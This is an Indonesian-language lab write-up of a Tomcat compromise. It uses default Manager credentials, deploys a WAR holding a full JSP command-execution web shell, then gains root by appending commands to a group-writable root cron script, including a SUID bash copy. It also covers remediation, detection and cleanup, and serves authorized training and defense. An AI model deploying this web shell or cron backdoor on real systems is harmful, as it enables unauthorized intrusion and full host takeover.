# Write-Up Privilege Escalation — Lab Catalina

> **Tujuan pembelajaran:** memahami rangkaian serangan dari enumerasi service, penyalahgunaan credential Tomcat Manager, deployment aplikasi WAR, remote command execution sebagai user `tomcat`, hingga privilege escalation melalui root cron script yang dapat ditulis oleh group `tomcat`.
>
> **Batasan penggunaan:** seluruh langkah dalam dokumen ini ditujukan untuk laboratorium atau sistem yang telah memberikan izin pengujian. Jangan menerapkannya pada sistem pihak lain tanpa izin tertulis.

---

## 1. Executive Summary

| Komponen | Informasi |
|---|---|
| Target | `192.168.56.117:8081` |
| Hostname | `catalina` |
| Service utama | Apache Tomcat |
| Sistem operasi | Linux, kernel `5.15.0-178-generic` |
| JVM | Java 17 |
| Akses awal | Tomcat Manager dengan credential lemah |
| User setelah RCE | `tomcat` (`uid=997`) |
| Jalur privilege escalation | Root cron menjalankan script yang writable oleh group `tomcat` |
| Akses akhir | `root` melalui `euid=0` |
| Tingkat risiko | **Critical** |

### Temuan Utama

1. **Tomcat Manager terekspos pada jaringan**
   - Endpoint administrasi `/manager` dapat dijangkau dari mesin penguji.
   - Endpoint tersebut memperluas attack surface aplikasi.

2. **Credential Tomcat Manager lemah atau telah diprakonfigurasi**
   - Credential `tomcat:s3cret` berhasil digunakan.
   - Akun memiliki akses ke Tomcat Manager text interface.

3. **Deployment aplikasi WAR memungkinkan Remote Command Execution**
   - Akun Tomcat Manager dapat melakukan deployment file WAR.
   - WAR berisi JSP command runner dijalankan sebagai user service `tomcat`.

4. **Root cron script dapat ditulis oleh group `tomcat`**
   - Cron menjalankan `/opt/backup/backup.sh` sebagai `root` setiap menit.
   - Script memiliki permission `-rwxrwxr-x root tomcat`.
   - User `tomcat` dapat mengubah script dan menyisipkan command yang kemudian dijalankan oleh `root`.

### Attack Chain

```text
Tomcat Manager terekspos
          ↓
Credential lemah tomcat:s3cret
          ↓
Akses manager-script / text interface
          ↓
Deployment WAR berisi JSP command runner
          ↓
Remote Command Execution sebagai tomcat
          ↓
Enumerasi cron dan permission filesystem
          ↓
/opt/backup/backup.sh writable oleh group tomcat
          ↓
Cron menjalankan payload sebagai root
          ↓
Privilege Escalation: euid=0(root)
```

---

## 2. Konsep Dasar untuk Pentester Pemula

### 2.1 Apa Itu Apache Tomcat?

Apache Tomcat adalah application server yang menjalankan aplikasi berbasis Java Servlet dan JSP.

Aplikasi Tomcat biasanya dikemas dalam format:

```text
WAR — Web Application Archive
```

File WAR dapat berisi:

- file JSP;
- class Java;
- library;
- konfigurasi aplikasi;
- resource statis.

Jika seseorang memiliki hak deployment pada Tomcat Manager, orang tersebut pada dasarnya dapat memasang aplikasi baru di server.

---

### 2.2 Apa Itu Tomcat Manager?

Tomcat Manager adalah antarmuka administrasi untuk:

- melihat aplikasi yang sedang berjalan;
- melakukan deploy atau undeploy aplikasi;
- memulai dan menghentikan aplikasi;
- melihat informasi server.

Beberapa endpoint penting:

```text
/manager/html         Antarmuka berbasis browser
/manager/text         Antarmuka berbasis teks atau API
/manager/status       Informasi status server
/manager/jmxproxy     Akses manajemen melalui JMX proxy
```

Akses ke endpoint tersebut harus dibatasi secara ketat karena dapat digunakan untuk menjalankan kode melalui deployment aplikasi.

---

### 2.3 Apa Itu JSP Command Runner?

JSP adalah teknologi server-side Java. File JSP diproses oleh Tomcat dan dapat menjalankan kode Java pada server.

Dalam laboratorium ini, sebuah JSP menerima parameter `cmd`, menjalankan command melalui `/bin/sh`, lalu menampilkan outputnya pada response HTTP.

Alurnya:

```text
Browser atau curl
      ↓
cmd.jsp?cmd=id
      ↓
Tomcat menjalankan JSP
      ↓
JSP menjalankan /bin/sh -c id
      ↓
Output dikirim kembali melalui HTTP
```

---

### 2.4 Apa Itu Remote Command Execution?

**Remote Command Execution (RCE)** berarti penguji dapat menjalankan command sistem operasi dari jarak jauh.

Pada lab ini, command berjalan sebagai user:

```text
tomcat
```

User `tomcat` bukan root, tetapi akses ini cukup untuk melakukan enumerasi lokal dan mencari kesalahan konfigurasi privilege.

---

### 2.5 Apa Itu Cron Job?

Cron adalah scheduler pada Linux yang menjalankan command secara otomatis berdasarkan jadwal.

Contoh:

```cron
* * * * * root /opt/backup/backup.sh
```

Artinya:

```text
Setiap menit, jalankan /opt/backup/backup.sh sebagai root.
```

Urutan lima tanda bintang:

```text
┌──────── menit
│ ┌────── jam
│ │ ┌──── hari dalam bulan
│ │ │ ┌── bulan
│ │ │ │ ┌ hari dalam minggu
│ │ │ │ │
* * * * *
```

---

### 2.6 Mengapa Root Cron Script yang Writable Berbahaya?

Cron memang dijalankan oleh `root`, tetapi keamanan cron juga bergantung pada file yang dipanggilnya.

Jika user berprivilege rendah dapat mengubah script tersebut:

```text
User rendah menulis command
          ↓
Root cron membaca script
          ↓
Root menjalankan command milik user rendah
```

Dengan demikian, kesalahan permission file dapat berubah menjadi privilege escalation.

---

### 2.7 Memahami Permission `rwxrwxr-x`

Contoh:

```text
-rwxrwxr-x 1 root tomcat /opt/backup/backup.sh
```

Permission dibagi menjadi tiga kelompok:

```text
rwx | rwx | r-x
 ^     ^     ^
 |     |     └── other
 |     └──────── group
 └────────────── owner
```

Interpretasinya:

| Subjek | Permission |
|---|---|
| Owner `root` | read, write, execute |
| Group `tomcat` | read, write, execute |
| Other | read, execute |

Karena user saat ini termasuk group `tomcat`, user tersebut dapat mengubah isi script.

---

### 2.8 UID dan EUID

- **UID** menunjukkan identitas asli proses.
- **EUID** atau effective user ID digunakan sistem untuk memeriksa hak akses proses.

Contoh hasil akhir:

```text
uid=997(tomcat) gid=997(tomcat) euid=0(root)
```

Artinya:

- proses berasal dari user `tomcat`;
- tetapi privilege efektifnya adalah `root`.

---

## 3. Phase 1 — Reconnaissance dan Service Enumeration

Tujuan tahap ini adalah memastikan target aktif, mengidentifikasi aplikasi yang tersedia, dan menemukan endpoint administrasi.

---

### 3.1 Memastikan Target Dapat Dijangkau

```bash
ping -c 4 192.168.56.117
```

### Penjelasan

| Bagian | Fungsi |
|---|---|
| `ping` | Mengirim ICMP echo request |
| `-c 4` | Mengirim empat paket |
| `192.168.56.117` | Alamat IP target |

Respons ping menunjukkan bahwa target dapat dijangkau dari mesin penguji.

> Tidak adanya respons ping belum tentu berarti target mati. Firewall dapat memblokir ICMP walaupun service TCP tetap aktif.

---

### 3.2 Directory Enumeration dengan Dirsearch

Gunakan URL lengkap:

```bash
dirsearch \
  -u http://192.168.56.117:8081 \
  -e jsp,html,txt
```

### Tujuan

Directory enumeration digunakan untuk menemukan:

- halaman administrasi;
- direktori tersembunyi;
- endpoint status;
- aplikasi bawaan;
- file sensitif yang tidak ditautkan dari halaman utama.

### Hasil Penting

```text
302 - /manager  -> /manager/
302 - /manager/ -> /manager/html
401 - /manager/html
401 - /manager/jmxproxy
401 - /manager/status/all
```

### Interpretasi Status HTTP

| Status | Arti |
|---|---|
| `200` | Resource dapat diakses |
| `301` | Redirect permanen |
| `302` | Redirect sementara |
| `401` | Autentikasi diperlukan |
| `403` | Server memahami request tetapi menolak akses |
| `404` | Resource tidak ditemukan |

Temuan `401` pada `/manager/html` bukan berarti endpoint tidak dapat digunakan. Justru status tersebut mengonfirmasi bahwa:

- endpoint tersedia;
- Tomcat Manager aktif;
- autentikasi diperlukan.

---

### 3.3 Validasi Manual Endpoint Tomcat Manager

```bash
curl -i \
  http://192.168.56.117:8081/manager/html
```

Hasil penting:

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

### Interpretasi

Header:

```text
WWW-Authenticate: Basic
```

menunjukkan bahwa endpoint menggunakan HTTP Basic Authentication.

Credential dikirim melalui header `Authorization`. Karena Basic Authentication hanya menggunakan encoding Base64, akses seharusnya dilakukan melalui HTTPS pada sistem produksi.

---

## 4. Phase 2 — Vulnerability Scanning dan Validasi Credential

Scanner digunakan untuk memperoleh petunjuk. Setiap hasil scanner tetap harus divalidasi secara manual agar tidak bergantung pada false positive.

---

### 4.1 Scanning dengan Nikto

```bash
nikto \
  -h http://192.168.56.117:8081
```

Hasil penting:

```text
/manager/html: Default account found for 'Tomcat Manager Application'
ID 'tomcat', PW 's3cret'
/manager/html: Tomcat Manager / Host Manager interface found
/manager/status: Tomcat Server Status interface found
```

### Analisis

Nikto mengindikasikan bahwa credential berikut mungkin valid:

```text
Username : tomcat
Password : s3cret
```

Temuan scanner belum menjadi bukti final. Credential harus diuji terhadap endpoint yang tepat.

---

### 4.2 Validasi Credential melalui Text Interface

```bash
curl -s \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

### Penjelasan Opsi

| Opsi | Fungsi |
|---|---|
| `-s` | Menyembunyikan progress meter |
| `-u` | Mengirim username dan password Basic Authentication |
| `/manager/text/list` | Menampilkan daftar aplikasi Tomcat |

Hasil:

```text
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/manager:running:3:manager
```

### Kesimpulan

Credential telah tervalidasi karena server mengembalikan:

```text
OK - Listed applications
```

Ini juga menunjukkan bahwa akun memiliki role yang dapat mengakses **manager text interface**, biasanya `manager-script`.

---

### 4.3 Mengambil Informasi Server

```bash
curl -s \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/serverinfo
```

Contoh hasil:

```text
OK - Server info
Tomcat Version: [Server]
OS Name: [Linux]
OS Version: [5.15.0-178-generic]
OS Architecture: [amd64]
JVM Version: [17.0.19+10-1-22.04.2-Ubuntu]
```

Informasi ini membantu menentukan:

- platform target;
- versi kernel;
- arsitektur sistem;
- versi Java;
- kompatibilitas aplikasi yang akan di-deploy.

---

## 5. Phase 3 — Initial Access melalui Deployment WAR

Karena credential memiliki akses deployment, file WAR dapat dipasang sebagai aplikasi baru.

---

### 5.1 Membuat Direktori Kerja

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd
```

Direktori ini digunakan untuk menyimpan file JSP dan package WAR.

---

### 5.2 Membuat JSP Command Runner

Buat file:

```text
cmd.jsp
```

Isi:

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");

if (cmd != null && !cmd.trim().isEmpty()) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process process = Runtime.getRuntime().exec(command);

    InputStream stdout = process.getInputStream();
    InputStream stderr = process.getErrorStream();

    byte[] buffer = new byte[4096];
    int length;

    out.println("<pre>");

    while ((length = stdout.read(buffer)) != -1) {
        out.write(new String(buffer, 0, length));
    }

    while ((length = stderr.read(buffer)) != -1) {
        out.write(new String(buffer, 0, length));
    }

    out.println("</pre>");
}
%>
```

### Cara Kerja

1. JSP membaca parameter `cmd`.
2. Parameter diteruskan ke `/bin/sh -c`.
3. Standard output dan standard error dibaca.
4. Hasil ditampilkan dalam tag `<pre>`.

Contoh request:

```text
/labcmd/cmd.jsp?cmd=id
```

---

### 5.3 Membuat File WAR

Menggunakan `jar`:

```bash
jar -cvf labcmd.war cmd.jsp
```

Alternatif menggunakan `zip`:

```bash
zip -r labcmd.war cmd.jsp
```

Periksa isi WAR:

```bash
unzip -l labcmd.war
```

Pastikan `cmd.jsp` berada pada root archive:

```text
cmd.jsp
```

bukan di dalam direktori tambahan yang tidak diinginkan.

---

### 5.4 Deploy WAR melalui Tomcat Manager

```bash
curl -s \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
```

### Penjelasan

| Bagian | Fungsi |
|---|---|
| `--upload-file labcmd.war` | Mengirim isi WAR melalui request |
| `path=/labcmd` | Menetapkan context path aplikasi |
| `update=true` | Memperbarui aplikasi jika path sudah ada |

Hasil:

```text
OK - Deployed application at context path [/labcmd]
```

### Verifikasi Deployment

```bash
curl -s \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

Cari entri:

```text
/labcmd:running
```

---

### 5.5 Memvalidasi Remote Command Execution

Gunakan encoding parameter yang aman:

```bash
BASE_URL="http://192.168.56.117:8081/labcmd/cmd.jsp"

curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

### Bukti Initial Access

Output tersebut membuktikan bahwa:

- JSP berhasil dijalankan;
- command sistem operasi berhasil dieksekusi;
- proses berjalan sebagai user `tomcat`;
- akses yang diperoleh belum root.

---

## 6. Phase 4 — Local System Enumeration

Tujuan enumerasi lokal adalah memahami konteks user, sistem operasi, filesystem, service, scheduled task, dan permission yang berpotensi disalahgunakan.

---

### 6.1 Membuat Variabel URL

```bash
BASE_URL="http://192.168.56.117:8081/labcmd/cmd.jsp"
```

Gunakan pola berikut untuk command selanjutnya:

```bash
curl -sG \
  --data-urlencode "cmd=<COMMAND>" \
  "$BASE_URL"
```

Keuntungan `--data-urlencode`:

- spasi dikodekan otomatis;
- karakter seperti `;`, `>`, `&`, dan tanda kutip lebih aman dikirim;
- mengurangi kesalahan URL parsing.

---

### 6.2 Memeriksa Identitas dan Lokasi Proses

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; whoami; groups; pwd; hostname" \
  "$BASE_URL"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
tomcat
/
catalina
```

Ringkasan:

| Informasi | Nilai |
|---|---|
| User | `tomcat` |
| Group | `tomcat` |
| Current directory | `/` |
| Hostname | `catalina` |
| Privilege | Non-root |

---

### 6.3 Memeriksa Sistem Operasi dan Kernel

```bash
curl -sG \
  --data-urlencode \
  "cmd=uname -a; echo; cat /etc/os-release" \
  "$BASE_URL"
```

Informasi ini membantu membedakan antara:

- exploit berbasis versi;
- kesalahan konfigurasi lokal;
- lingkungan container;
- host Linux penuh.

Pada lab ini, jalur privilege escalation berasal dari kesalahan permission, bukan exploit kernel.

---

### 6.4 Memeriksa Apakah Target Berjalan dalam Container

Nama `catalina` sendiri bukan bukti bahwa target menggunakan container. `Catalina` juga merupakan nama komponen utama Tomcat.

Lakukan pemeriksaan:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /proc/1/cgroup; echo; ls -la /.dockerenv 2>/dev/null; echo; mount | head -50" \
  "$BASE_URL"
```

Hasil penting:

```text
0::/init.scope
/dev/sda2 on / type ext4 (rw,relatime)
```

Indikator yang tidak ditemukan:

```text
/.dockerenv
overlay filesystem
docker atau kubepods pada cgroup
```

### Kesimpulan

Target kemungkinan besar merupakan host atau virtual machine Linux biasa, bukan Docker container.

---

### 6.5 Area yang Perlu Diperiksa Saat Privilege Escalation

Beberapa area umum:

```text
sudo permission
SUID/SGID binary
cron job dan systemd timer
file konfigurasi berisi credential
script root yang writable
PATH hijacking
service dengan permission lemah
capabilities
NFS atau mount option
kernel dan package usang
```

Dalam lab ini, jalur yang relevan ditemukan pada cron job.

---

## 7. Phase 5 — Enumerasi Cron Job

### 7.1 Membaca Konfigurasi Cron

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/crontab 2>/dev/null; echo; ls -lah /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly 2>/dev/null" \
  "$BASE_URL"
```

Ditemukan file custom:

```text
/etc/cron.d/backup
```

---

### 7.2 Membaca Isi dan Permission Cron File

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/cron.d/backup; echo; stat -c '%A %a %U %G %n' /etc/cron.d/backup" \
  "$BASE_URL"
```

Hasil:

```text
* * * * * root /opt/backup/backup.sh

-rw-r--r-- 644 root root /etc/cron.d/backup
```

### Interpretasi

- Cron berjalan setiap menit.
- Command dijalankan sebagai user `root`.
- File cron dimiliki oleh `root`.
- User `tomcat` tidak dapat mengubah file cron.

Namun, keamanan belum selesai dianalisis. Script yang dipanggil juga harus diperiksa.

---

## 8. Phase 6 — Analisis Permission Script Backup

### 8.1 Memeriksa Seluruh Path

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -ld /opt /opt/backup; ls -l /opt/backup/backup.sh; echo; stat -c '%A %a %U %G %n' /opt /opt/backup /opt/backup/backup.sh; echo; cat /opt/backup/backup.sh" \
  "$BASE_URL"
```

Hasil penting:

```text
-rwxrwxr-x 1 root tomcat 26 Jun 28 10:26 /opt/backup/backup.sh
-rwxrwxr-x 775 root tomcat /opt/backup/backup.sh

#!/bin/bash
# backup task
```

### Analisis

| Atribut | Nilai |
|---|---|
| Owner | `root` |
| Group | `tomcat` |
| Mode | `775` |
| Group write | Ya |
| Dijalankan cron sebagai | `root` |

Karena proses RCE berjalan sebagai user dan group `tomcat`, script dapat diubah.

---

### 8.2 Membuktikan File Writable

Pengujian aman:

```bash
curl -sG \
  --data-urlencode \
  "cmd=test -w /opt/backup/backup.sh && echo WRITABLE || echo NOT_WRITABLE" \
  "$BASE_URL"
```

Hasil:

```text
WRITABLE
```

### Mengapa Ini Menjadi Privilege Escalation?

```text
tomcat dapat menulis backup.sh
        +
root menjalankan backup.sh
        =
tomcat dapat menentukan command yang dijalankan root
```

Ini merupakan bentuk **writable privileged script**.

---

## 9. Phase 7 — Proof of Privilege Escalation

Untuk asesmen profesional, gunakan pembuktian seminimal mungkin. Membuat file bukti jauh lebih aman daripada langsung membuat root shell.

---

### 9.1 Membuat Backup Script Asli

```bash
curl -sG \
  --data-urlencode \
  "cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak && ls -l /tmp/backup.sh.bak" \
  "$BASE_URL"
```

Tujuannya adalah agar perubahan dapat dikembalikan setelah pengujian.

Periksa isi backup:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/backup.sh.bak" \
  "$BASE_URL"
```

---

### 9.2 Menambahkan Command Pembuktian Non-Destruktif

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh" \
  "$BASE_URL"
```

Periksa perubahan:

```bash
curl -sG \
  --data-urlencode \
  "cmd=tail -n 5 /opt/backup/backup.sh" \
  "$BASE_URL"
```

Isi akhir akan menyerupai:

```bash
#!/bin/bash
# backup task

id > /tmp/root_proof
```

---

### 9.3 Memeriksa Hasil pada Siklus Cron Berikutnya

Setelah cron menjalankan script, periksa:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/root_proof 2>/dev/null; echo; ls -l /tmp/root_proof 2>/dev/null" \
  "$BASE_URL"
```

Hasil:

```text
uid=0(root) gid=0(root) groups=0(root)
-rw-r--r-- 1 root root /tmp/root_proof
```

### Bukti Keberhasilan

Terdapat dua indikator:

1. Isi file menampilkan `uid=0(root)`.
2. File dimiliki oleh `root:root`.

Hal ini membuktikan bahwa command yang ditulis oleh user `tomcat` telah dijalankan cron sebagai root.

> Untuk laporan penetration testing, bukti ini pada umumnya sudah cukup. Tidak selalu diperlukan shell root interaktif.

---

## 10. Demonstrasi Lab — SUID Bash sebagai Root Shell

> **Catatan:** langkah ini lebih intrusif daripada proof file. Gunakan hanya jika tujuan laboratorium memang meminta demonstrasi root shell. Pada asesmen produksi, berhenti setelah pembuktian minimal kecuali scope secara eksplisit mengizinkan tindakan lanjutan.

---

### 10.1 Menambahkan Payload Pembuatan SUID Bash

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchown root:root /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$BASE_URL"
```

Ketika cron berjalan sebagai root, command tersebut akan:

1. menyalin `/bin/bash` ke `/tmp/rootbash`;
2. memastikan owner-nya `root`;
3. memasang mode `4755`.

---

### 10.2 Memeriksa Permission SUID Bash

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/rootbash 2>/dev/null; stat -c '%A %a %U %G %n' /tmp/rootbash 2>/dev/null" \
  "$BASE_URL"
```

Hasil yang diharapkan:

```text
-rwsr-xr-x 1 root root /tmp/rootbash
-rwsr-xr-x 4755 root root /tmp/rootbash
```

Huruf `s` pada permission owner menunjukkan bit SUID aktif.

---

### 10.3 Menjalankan Command dengan Effective UID Root

```bash
curl -sG \
  --data-urlencode \
  "cmd=/tmp/rootbash -p -c 'id; whoami; hostname'" \
  "$BASE_URL"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) euid=0(root) groups=997(tomcat)
root
catalina
```

Bagian terpenting:

```text
euid=0(root)
```

Opsi `-p` pada Bash mempertahankan effective privilege yang diperoleh dari SUID binary.

---

### 10.4 Apabila SUID Bash Tidak Berfungsi

Kemungkinan penyebab:

- filesystem `/tmp` menggunakan opsi `nosuid`;
- file tidak dimiliki `root`;
- mode `4755` gagal diterapkan;
- security module membatasi eksekusi;
- Bash menurunkan privilege karena tidak menggunakan `-p`.

Periksa mount option:

```bash
curl -sG \
  --data-urlencode \
  "cmd=findmnt -no TARGET,OPTIONS /tmp 2>/dev/null; mount | grep ' /tmp '" \
  "$BASE_URL"
```

Walaupun SUID shell gagal, file `/tmp/root_proof` tetap cukup untuk membuktikan privilege escalation.

---

## 11. Root Cause Analysis

### 11.1 Credential Management yang Lemah

Credential:

```text
tomcat:s3cret
```

dapat digunakan untuk mengakses endpoint manajemen.

Masalah yang mungkin terjadi:

- password mudah ditebak;
- credential contoh tidak diganti;
- akun manajemen digunakan tanpa pembatasan jaringan;
- tidak ada monitoring login manajemen;
- role akun terlalu luas.

---

### 11.2 Management Interface Terekspos

Tomcat Manager dapat dijangkau dari jaringan penguji.

Dampaknya:

- endpoint dapat ditemukan melalui scanning;
- credential dapat diuji secara langsung;
- fitur deployment dapat disalahgunakan;
- informasi server dapat diambil.

---

### 11.3 Role Tomcat Mengizinkan Deployment

Akun berhasil mengakses:

```text
/manager/text/list
/manager/text/serverinfo
/manager/text/deploy
```

Artinya akun memiliki privilege manajemen yang cukup untuk melakukan deployment aplikasi.

---

### 11.4 Root Cron Menjalankan Script yang Tidak Terlindungi

Cron file sendiri aman:

```text
-rw-r--r-- root root /etc/cron.d/backup
```

Namun script yang dipanggil tidak aman:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Root cause privilege escalation adalah:

```text
Root mengeksekusi file yang dapat dimodifikasi service account berprivilege rendah.
```

---

### 11.5 Kegagalan Penerapan Least Privilege

User `tomcat` seharusnya hanya memiliki permission yang diperlukan untuk menjalankan application server.

User tersebut tidak seharusnya:

- menulis script operasional milik root;
- mengubah scheduled task;
- menulis executable yang dijalankan root;
- memiliki akses manajemen deployment dari jaringan umum.

---

## 12. Impact

Rangkaian temuan memungkinkan:

1. akses ke Tomcat Manager;
2. deployment aplikasi berbahaya;
3. remote command execution sebagai `tomcat`;
4. pembacaan file yang dapat diakses service account;
5. modifikasi root cron script;
6. eksekusi command sebagai root;
7. pengambilalihan penuh host;
8. pencurian credential atau data aplikasi;
9. perubahan konfigurasi dan persistence;
10. penggunaan server sebagai titik pivot ke jaringan lain.

### Severity

```text
Critical
```

Alasannya:

```text
Akses dari antarmuka web manajemen dapat dikembangkan menjadi
remote command execution dan akhirnya full root access pada host.
```

---

## 13. Attack Path Lengkap

### Tahap 1 — Discovery

```text
Target 192.168.56.117:8081 dapat dijangkau.
Directory enumeration menemukan /manager.
```

### Tahap 2 — Credential Compromise

```text
Nikto memberikan petunjuk credential tomcat:s3cret.
Credential divalidasi melalui /manager/text/list.
```

### Tahap 3 — Initial Access

```text
Akun Tomcat Manager melakukan deployment labcmd.war.
cmd.jsp memberikan command execution sebagai uid=997(tomcat).
```

### Tahap 4 — Local Enumeration

```text
Target diidentifikasi sebagai host Linux.
Enumerasi cron menemukan /etc/cron.d/backup.
```

### Tahap 5 — Privilege Escalation

```text
Cron root menjalankan /opt/backup/backup.sh setiap menit.
Script writable oleh group tomcat.
Command pembuktian ditambahkan ke script.
Cron menjalankan command sebagai uid=0(root).
```

### Tahap 6 — Root Demonstration

```text
Cron membuat /tmp/rootbash dengan SUID root.
Bash -p menghasilkan euid=0(root).
```

---

## 14. Evidence Penting

| No. | Evidence | Hasil |
|---:|---|---|
| 1 | Directory enumeration | `/manager/html`, `/manager/jmxproxy`, dan `/manager/status/all` ditemukan |
| 2 | HTTP validation | `/manager/html` mengembalikan `401 Basic Authentication` |
| 3 | Credential validation | `tomcat:s3cret` berhasil mengakses `/manager/text/list` |
| 4 | Server information | Linux kernel `5.15.0-178-generic`, Java 17 |
| 5 | WAR deployment | `OK - Deployed application at context path [/labcmd]` |
| 6 | RCE | `uid=997(tomcat) gid=997(tomcat)` |
| 7 | Cron configuration | `* * * * * root /opt/backup/backup.sh` |
| 8 | Script permission | `-rwxrwxr-x root tomcat /opt/backup/backup.sh` |
| 9 | Write validation | `test -w` menghasilkan `WRITABLE` |
| 10 | Root proof | `/tmp/root_proof` berisi `uid=0(root)` |
| 11 | SUID shell | `/tmp/rootbash` memiliki mode `4755 root root` |
| 12 | Final proof | `/tmp/rootbash -p` menghasilkan `euid=0(root)` |

---

## 15. Rekomendasi Perbaikan

### 15.1 Tindakan Darurat

1. Nonaktifkan atau batasi akses Tomcat Manager.
2. Rotasi credential `tomcat:s3cret`.
3. Undeploy aplikasi yang tidak sah.
4. Hentikan penggunaan `/opt/backup/backup.sh` sampai permission diperbaiki.
5. Hapus SUID binary atau file bukti yang dibuat selama pengujian.
6. Tinjau log untuk menentukan apakah eksploitasi pernah terjadi sebelumnya.

---

### 15.2 Hardening Tomcat Manager

Batasi akses berdasarkan IP menggunakan `RemoteAddrValve`, misalnya pada konfigurasi context Manager:

```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127\.\d+\.\d+\.\d+|::1|192\.168\.56\.10" />
```

Sesuaikan allowlist dengan alamat administrator yang sah.

Praktik lain:

- gunakan VPN atau bastion host;
- jangan expose port manajemen ke jaringan publik;
- gunakan HTTPS;
- hapus aplikasi Manager jika tidak diperlukan;
- aktifkan logging dan alert login;
- batasi akses menggunakan firewall host dan network ACL.

---

### 15.3 Perbaikan Credential dan Role

Gunakan password kuat dan unik.

Contoh konseptual:

```xml
<role rolename="manager-gui"/>
<user username="admin-tomcat"
      password="PASSWORD_PANJANG_DAN_UNIK"
      roles="manager-gui"/>
```

Pisahkan akun berdasarkan fungsi:

```text
manager-gui      untuk antarmuka browser
manager-script   untuk automation atau text API
manager-jmx      untuk JMX proxy
manager-status   untuk status
```

Jangan memberikan `manager-script` kepada akun yang hanya membutuhkan akses GUI.

> Pada Tomcat, akun dengan `manager-script` dapat melakukan tindakan administrasi sensitif. Role tersebut harus diperlakukan seperti credential berprivilege tinggi.

---

### 15.4 Perbaikan Permission Cron Script

Ubah owner dan group:

```bash
sudo chown root:root /opt/backup/backup.sh
```

Gunakan permission ketat:

```bash
sudo chmod 750 /opt/backup/backup.sh
```

Atau hanya root:

```bash
sudo chmod 700 /opt/backup/backup.sh
```

Perbaiki direktori induk:

```bash
sudo chown root:root /opt/backup
sudo chmod 750 /opt/backup
```

Verifikasi:

```bash
namei -l /opt/backup/backup.sh
stat -c '%A %a %U %G %n' \
  /opt \
  /opt/backup \
  /opt/backup/backup.sh
```

---

### 15.5 Audit Scheduled Task

Periksa cron:

```bash
sudo grep -RInE '.' \
  /etc/crontab \
  /etc/cron.d \
  /var/spool/cron/crontabs 2>/dev/null
```

Periksa systemd timer:

```bash
systemctl list-timers --all
```

Untuk setiap task berprivilege tinggi, verifikasi bahwa:

- file dimiliki root;
- file tidak writable oleh group atau other;
- direktori induk tidak writable oleh user rendah;
- command menggunakan absolute path;
- environment seperti `PATH` dikendalikan;
- file dependency juga terlindungi.

---

### 15.6 Audit File Writable oleh Service Account

Contoh pemeriksaan:

```bash
sudo -u tomcat find /opt /usr/local /etc \
  -writable \
  -ls 2>/dev/null
```

Fokus pada:

- script shell;
- executable;
- konfigurasi service;
- file cron;
- unit systemd;
- library;
- direktori yang digunakan oleh root.

---

### 15.7 Monitoring dan Detection

Pantau:

- login ke `/manager`;
- deployment atau undeployment aplikasi;
- file WAR baru;
- perubahan pada `webapps`;
- perubahan `/etc/cron*`;
- perubahan `/opt/backup/backup.sh`;
- pembuatan file SUID;
- command mencurigakan dari proses Java/Tomcat.

Contoh pencarian SUID:

```bash
find / -xdev -perm -4000 -type f -ls 2>/dev/null
```

Simpan baseline dan bandingkan secara berkala.

---

## 16. Cleanup Setelah Pengujian

Cleanup harus mengembalikan sistem ke kondisi sebelum pengujian.

> Jalankan cleanup dengan hati-hati dan pastikan file backup memang berasal dari script asli.

---

### 16.1 Mengembalikan Script Backup

Karena script masih writable oleh `tomcat`, isi dapat dikembalikan dari backup:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/backup.sh.bak > /opt/backup/backup.sh" \
  "$BASE_URL"
```

Verifikasi:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /opt/backup/backup.sh" \
  "$BASE_URL"
```

---

### 16.2 Menghapus File Root Proof dan SUID Bash

Gunakan privilege root dari SUID Bash:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/tmp/rootbash -p -c 'rm -f /tmp/root_proof /tmp/backup.sh.bak; chmod u-s /tmp/rootbash; rm -f /tmp/rootbash'" \
  "$BASE_URL"
```

Verifikasi:

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/root_proof /tmp/rootbash /tmp/backup.sh.bak 2>&1" \
  "$BASE_URL"
```

---

### 16.3 Undeploy Aplikasi WAR

```bash
curl -s \
  -u tomcat:s3cret \
  "http://192.168.56.117:8081/manager/text/undeploy?path=/labcmd"
```

Hasil yang diharapkan:

```text
OK - Undeployed application at context path [/labcmd]
```

Verifikasi:

```bash
curl -s \
  -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list
```

Pastikan `/labcmd` tidak lagi tercantum.

---

### 16.4 Menghapus Artefak Lokal

Pada mesin penguji:

```bash
rm -rf ~/tomcat-lab/labcmd
rm -f ~/tomcat-lab/labcmd.war
```

---

